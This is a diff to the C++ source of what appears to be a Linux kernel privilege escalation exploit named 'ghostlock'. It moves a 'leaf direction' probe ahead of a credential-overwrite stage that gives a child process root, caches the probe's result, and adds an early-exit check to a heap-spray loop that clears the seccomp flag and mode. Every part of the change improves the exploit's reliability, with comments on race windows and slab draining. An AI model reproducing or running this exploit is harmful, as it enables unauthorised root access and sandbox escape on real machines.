@@ -279,6 +279,42 @@ namespace ghostlock::session::backend {
             }
             support::run_state::complete("w2b");
 
+            /* W3-0 leaf direction probe, relocated BEFORE the credential write:
+ * the child is still unprivileged here, so a missed probe retires a
+ * child that holds no root (kill + reap, same as a failed perf leak)
+ * instead of parking a rooted one, and the probe's race window never
+ * coexists with a rooted task's sys_exit. Only the pselect-style
+ * primitive (non-exact target) needs it, and only when this process
+ * actually carries a seccomp filter (the shell flow skips W3 whole).
+ * The learned direction is cached in the chain and reused by every
+ * later W3 round, so the probe write is paid at most once per run. */
+            if constexpr (!M::w3_exact_target) {
+                if (chain.leaf_dir < 0 && attack::process_has_seccomp()) {
+                    support::run_state::enter("w3a");
+                    victim::w3_stage_context probe_context = {
+                        .pipes = pipes,
+                        .leaf_to_target8 = 1,
+                    };
+                    const Status dir_ok = retry_write_stage<M>(
+                        session, "W3-0: leaf dir", child_task + ghostlock::profile::task_comm_off(), 1, 4, 50000,
+                        victim::verify_leaf_dir_stage, &probe_context, 1);
+                    if (!dir_ok) {
+                        pr_warning("W3 leaf direction probe failed; retiring unrooted child\n");
+                        const pid_t unrooted = pipes.release_child();
+                        if (unrooted > 0) {
+                            kill(-unrooted, SIGKILL);
+                            waitpid(unrooted, nullptr, 0);
+                        }
+                        child_alive = 0;
+                        pipes.cmd_write.reset();
+                        pipes.uid_read.reset();
+                        return VictimRound::Retry;
+                    }
+                    chain.leaf_dir = probe_context.leaf_to_target8;
+                    support::run_state::complete("w3a");
+                }
+            }
+
             support::run_state::enter("w2a");
             Status got_root = retry_write_stage<M>(
                 session, "W2: cred", child_task + ghostlock::profile::task_cred_off(), 2,
@@ -330,16 +366,28 @@ namespace ghostlock::session::backend {
             };
             if (!exact_target) {
                 support::run_state::enter("w3a");
-                Status dir_ok = retry_write_stage<M>(
-                    session, "W3-0: leaf dir", child_task + ghostlock::profile::task_comm_off(), 1, 4, 50000,
-                    victim::verify_leaf_dir_stage, &w3_context, 1);
-                if (!dir_ok) {
-                    /* U01/S14: upstream retires the child instead of guessing the leaf
+                if (chain.leaf_dir >= 0) {
+                    /* Learned by the probe that ran inside w2(), before the
+                 * credential write; covers this round and every later one. */
+                    w3_context.leaf_to_target8 = chain.leaf_dir;
+                    pr_info("W3: leaf direction cached=%d (probe ran before W2)\n",
+                            chain.leaf_dir);
+                } else {
+                    /* Defensive: the probe normally runs in w2(). If it somehow
+                 * did not (e.g. a seccomp filter appeared between the stages),
+                 * fall back to probing here, the pre-move behaviour. */
+                    Status dir_ok = retry_write_stage<M>(
+                        session, "W3-0: leaf dir", child_task + ghostlock::profile::task_comm_off(), 1, 4, 50000,
+                        victim::verify_leaf_dir_stage, &w3_context, 1);
+                    if (!dir_ok) {
+                        /* U01/S14: upstream retires the child instead of guessing the leaf
                  * direction and blind-writing the task neighbour. Returning false
                  * hands control back to the W2/W3 chain, which parks this child and
                  * spawns a fresh one for the next round. */
-                    pr_warning("W3 leaf direction probe failed; retiring child\n");
-                    return false;
+                        pr_warning("W3 leaf direction probe failed; retiring child\n");
+                        return false;
+                    }
+                    chain.leaf_dir = w3_context.leaf_to_target8;
                 }
                 support::run_state::complete("w3a");
             } else {
@@ -355,6 +403,12 @@ namespace ghostlock::session::backend {
 
             uint32_t w3_attempts = g_exploit_session.profile.w3_attempts();
             for (uint32_t attempt = 1; attempt <= w3_attempts; attempt++) {
+                /* The previous attempt's mode write can land after its verify
+                 * read; check before paying for another heap spray. */
+                if (attempt > 1 && victim::verify_seccomp_probe_stage(&w2_context)) {
+                    seccomp_ok = 1;
+                    break;
+                }
                 pr_info("W3: TIF_SECCOMP+mode attempt %u/%u\n", attempt, w3_attempts);
                 if (attempt == 1) attack::slab_drain();
                 support::run_state::enter("w3b");
